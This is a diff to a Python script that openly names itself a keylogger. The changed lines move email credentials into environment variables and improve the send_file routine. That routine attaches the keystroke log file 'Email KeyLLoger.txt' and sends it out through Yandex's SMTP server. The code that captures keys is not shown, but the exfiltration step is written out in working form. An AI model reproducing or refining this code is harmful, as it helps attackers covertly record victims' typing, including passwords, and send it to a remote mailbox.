@@ -1,11 +1,13 @@
 import ctypes
 import datetime
 import os
+import smtplib
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
-import smtplib
+from dotenv import load_dotenv, find_dotenv
 
+load_dotenv(find_dotenv())
 size_my_file = 47  # размер в байтах
 
 
@@ -38,10 +40,10 @@ def send_file():
     date = datetime.datetime.now()
     date_time = date.strftime('%d-%m-%Y|%H:%M:%S')
     message = MIMEMultipart()
-    message['From'] = ''
-    message['To'] = ''
+    message['From'] = os.getenv('EMAIL')
+    message['To'] = os.getenv('EMAIL')
     message['Subject'] = f'Keylloger {date_time}'
-    file_name = 'keylloger_file.txt'
+    file_name = 'Email KeyLLoger.txt'
     attachment = open(file_name, 'rb')
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(attachment.read())
@@ -49,8 +51,8 @@ def send_file():
     part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
     message.attach(part)
     with smtplib.SMTP_SSL('smtp.yandex.ru', 465) as server:
-        server.ehlo('')
-        server.login('', '')
+        server.ehlo(os.getenv('EMAIL'))
+        server.login(os.getenv('EMAIL'), os.getenv('PASSWORD'))
         server.auth_plain()
         result = server.send_message(message)
         if result is None:
